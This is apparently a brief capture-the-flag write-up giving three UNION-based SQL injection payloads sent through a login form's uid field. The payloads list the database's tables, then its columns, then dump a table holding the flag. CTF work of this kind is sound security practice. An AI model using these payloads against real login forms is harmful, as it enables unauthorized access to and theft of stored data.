



# Get the name of the tables first
```
uid=admin'+UNION+SELECT+1,+GROUP_CONCAT(table_name),+3,+4+FROM+information_schema.tables+WHERE+table_schema=database()+#&upw=apple
```
The condition WHERE table_schema=database() is used as a filter to ensure that you only grab data from the current database that the website is actively using.
# Then get the name of all collums
```
uid=admin'+UNION+SELECT+1,+GROUP_CONCAT(column_name),+3,+4+FROM+information_schema.columns+WHERE+table_schema=database()+and+table_name='onlyflag'#&upw=apple
```
# Finally get the flag
```
uid=admin'+UNION+SELECT+1,+GROUP_CONCAT(+sname,+svalue,+sflag,+sclose),+3,+4+FROM+onlyflag+#&upw=apple
```